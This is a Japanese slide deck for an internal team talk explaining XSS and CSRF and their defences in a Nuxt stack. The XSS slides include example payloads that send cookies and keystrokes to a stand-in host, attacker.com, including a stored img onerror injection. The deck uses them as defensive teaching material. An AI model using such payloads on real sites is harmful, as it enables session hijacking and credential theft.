---
marp: true
theme: default
paginate: true
style: |
  section {
    font-family: 'Hiragino Sans', 'Noto Sans JP', sans-serif;
    font-size: 26px;
  }
  h1 { color: #c0392b; border-bottom: 3px solid #c0392b; padding-bottom: 8px; }
  h2 { color: #1a1a1a; }
  table { font-size: 21px; }
  code { background: #f0f0f0; color: #1a1a1a; padding: 2px 6px; border-radius: 4px; font-size: 22px; }
  pre { background: #1e1e1e; color: #d4d4d4; font-size: 19px; }
  pre code { background: transparent; color: inherit; padding: 0; }
  pre .hljs-string { color: #ce9178; }
  pre .hljs-attr { color: #9cdcfe; }
  pre .hljs-keyword { color: #569cd6; }
  pre .hljs-comment { color: #6a9955; }
  pre .hljs-number { color: #b5cea8; }
  blockquote { border-left: 4px solid #c0392b; color: #444; }
---

# XSSとCSRFを<br>攻撃フローで理解する

対策の名前より「何を止めるか」を覚える

2026 / チーム内LT

---

## XSSとCSRFとは

**XSS（クロスサイトスクリプティング）**
攻撃者のスクリプトを、被害者のブラウザで実行させる攻撃

**CSRF（クロスサイトリクエストフォージェリ）**
被害者のブラウザから、意図しないリクエストを送らせる攻撃

---

## アジェンダ

各攻撃を **脅威 → 脆弱性 → 対策** の順で整理する

- 脅威：攻撃者が何をしようとしているか
- 脆弱性：なぜそれが可能になるか
- 対策：どの脆弱性・脅威を潰すか

---

# XSS

---

## XSSの脅威

攻撃者のスクリプトがブラウザで実行されると何ができるか

```javascript
// Cookieを盗む → 攻撃者がセッションを乗っ取る
fetch('https://attacker.com/?c=' + document.cookie)

// キーロガー → パスワードやクレカ番号がリアルタイムで漏れる
document.addEventListener('keydown', e => fetch('https://attacker.com/?k=' + e.key))

// 画面を書き換える → 偽ログインフォームでフィッシング
document.body.innerHTML = '<偽のログインフォーム>'
```

---

## XSSの脆弱性

なぜ攻撃者のスクリプトが実行されるのか

```javascript
// DBに保存されたコメントが…
comment = '<img src=x onerror="fetch(\'https://attacker.com/?c=\'+document.cookie)">'
```

```vue
<!-- ユーザー入力をエスケープせずHTMLとして挿入している -->
<div v-html="comment" />

<!-- テキストとして挿入すればタグは実行されない -->
<p>{{ comment }}</p>
```

**ユーザー入力をそのままHTMLに埋め込んでいることが脆弱性**

---

## XSS 対策① サニタイズ・`{{ }}` — ユーザー入力がHTMLとして実行されるのを防ぐ

```vue
<!-- {{ }} は自動エスケープ → タグが文字として表示される -->
<p>{{ comment }}</p>

<!-- v-html を使う場合は DOMPurify を通す -->
<div v-html="DOMPurify.sanitize(comment)" />
```

DOMPurify は `onerror` などの危険な属性を除去しつつHTMLタグは残す

---

## XSS 対策② CSP — サニタイズをすり抜けたスクリプトの実行を止める

サニタイズの実装漏れ・ライブラリの脆弱性は防ぎきれない。  
CSPはその後ろに立つ防衛線。

```typescript
// nuxt.config.ts
security: {
  headers: {
    contentSecurityPolicy: { 'script-src': ["'self'"] }
  }
}
```

`onerror` などのインラインスクリプトをブラウザがブロックする

---

## XSS 対策③ HttpOnly Cookie — CookieのJS経由の持ち出しを防ぐ

```typescript
setCookie(event, 'token', value, {
  httpOnly: true,  // document.cookie から読めない
})
```

スクリプトが実行されても `document.cookie` が空になる

サニタイズ・CSPと合わせた多層防御で被害を最小化する

---

## XSS まとめ

| | 脅威 | 脆弱性 | 対策 |
|---|---|---|---|
| **サニタイズ・`{{ }}`** | | ユーザー入力がHTMLに混入 | 脆弱性を塞ぐ |
| **CSP** | スクリプトの実行 | | 脅威を防ぐ |
| **HttpOnly** | Cookie の持ち出し | | 脅威の被害を最小化 |

対策が違えば、塞いでいるものも違う

---

# CSRF

---

## CSRFの脅威

被害者の権限で意図しない操作が実行される

- 送金・購入が勝手に完了する
- パスワード・メールアドレスを変更されてアカウントを乗っ取られる
- ユーザーの名義でSNSに投稿される

**被害者は何もしていない。別のサイトを開いただけ。**

---

## CSRFの脆弱性

なぜ別サイトを開いただけで攻撃が成立するのか

**脆弱性①：Cookieは別サイトからのリクエストにも自動付与される**

```
被害者が bank.local にログイン中（Cookieあり）
        ↓
attacker.local が bank.local へのリクエストを発火
        ↓
ブラウザが自動でCookieを付ける → 認証済みリクエストになる
```

**脆弱性②：サーバーがリクエストの出所を検証していない**

Cookieが付いていれば正規ユーザーのリクエストと区別できない

---

## CSRF 対策① SameSite Cookie — 別サイトのリクエストにCookieが付くのを防ぐ

| リクエスト種別 | Lax | Strict |
|---|---|---|
| POST / fetch | Cookieを付けない | Cookieを付けない |
| リンクからのGET遷移 | **Cookieを付ける** | Cookieを付けない |

Lax はPOSTのCSRFを防ぐが、GETリンク経由のCSRFは通る  
Strict はリンク遷移も含めてすべて防ぐ

---

## CSRF 対策② CSRFトークン — リクエストの出所を検証する

```
サーバーがHTMLに秘密値を埋め込む
        ↓
クライアントはリクエスト時に秘密値を添付する
        ↓
サーバーが値の一致を確認する
```

攻撃者は Same-Origin Policy でHTMLを読めない → 秘密値がわからない → 偽造できない

```typescript
security: { csrf: true }  // nuxt-security で自動対応
```

---

## CSRF まとめ

| | 脆弱性 | 対策 |
|---|---|---|
| **SameSite=Lax** | POSTのCookieが自動付与 | 脆弱性①（POST）を塞ぐ |
| **SameSite=Strict** | GETリンクのCookieも自動付与 | 脆弱性①（全リクエスト）を塞ぐ |
| **CSRFトークン** | 出所の未検証 | 脆弱性②を塞ぐ |

---

## 全体まとめ

| 対策 | 何を塞ぐか |
|---|---|
| `{{ }}` / サニタイズ | 脆弱性：ユーザー入力のHTMLへの混入 |
| CSP | 脅威：スクリプトの実行 |
| HttpOnly Cookie | 脅威：CookieのJS経由の持ち出し |
| SameSite=Lax | 脆弱性：POST/fetchへのCookie自動付与 |
| SameSite=Strict | 脆弱性：GETリンク含む全リクエストへの自動付与 |
| CSRFトークン | 脆弱性：リクエストの出所の未検証 |

---

## うちのスタック（Nuxt）で今日からやること

```bash
npm install nuxt-security
```

```typescript
export default defineNuxtConfig({
  modules: ['nuxt-security'],
  security: {
    headers: { contentSecurityPolicy: { 'script-src': ["'self'"] } },
    csrf: true,
  }
})
```

```typescript
setCookie(event, 'token', value, {
  httpOnly: true, secure: true, sameSite: 'strict',
})
```

---

## デモ

```bash
git clone https://github.com/okawara0618info-coder/xss-csrf-demo
cd xss-csrf-demo && npm install
node victim.js   # bank.local:3000
node attacker.js # attacker.local:3001
```

各対策を ON/OFF しながら攻撃の成否を確認できます

---

# ありがとうございました
